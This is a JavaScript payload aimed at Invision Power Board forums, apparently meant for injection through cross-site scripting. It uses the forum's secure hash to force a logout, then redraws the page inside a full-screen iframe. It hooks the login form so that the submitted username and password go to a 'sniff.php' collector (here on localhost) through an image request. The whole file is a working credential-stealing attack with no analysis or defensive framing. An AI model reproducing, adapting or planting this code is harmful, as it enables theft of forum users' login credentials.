function getCookie(name) {
	var matches = document.cookie.match(new RegExp("(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"));
	return matches ? decodeURIComponent(matches[1]) : undefined;
}

function Sniff(){
	frdoc = window.frames.fr.contentDocument || window.frames.fr.document

	var far = frdoc.getElementsByTagName('form');
	for(var i=0; i<far.length; i++){
		if(far[i].id=='login'){
			far[i].onsubmit=function(){
				(new Image()).src='http://localhost/sniffer/sniff.php?a=login='+this.ips_username.value+' password='+this.ips_password.value
				document.cookie = 'ipbssx=1'
			}
		}
	}
}

function Kill(){
	//if(getCookie('ipbssx')!='1'){
		document.body.style.overflow = 'hidden';
		document.documentElement.innerHTML='<iframe  name="fr" onload="Sniff();" src="'+location.pathname+location.search+'&'+Math.random()+'" style="border: 0; width: '+document.documentElement.clientWidth+'px; height: '+document.documentElement.clientHeight+'px"></irfame>';document.body.style.margin=0;
	//}
}

img = new Image();
img.src = 'index.php?app=core&module=global&section=login&do=logout&k=' + ipb.vars['secure_hash'] ;
img.setAttribute("onerror", "Kill();");
document.body.appendChild(img);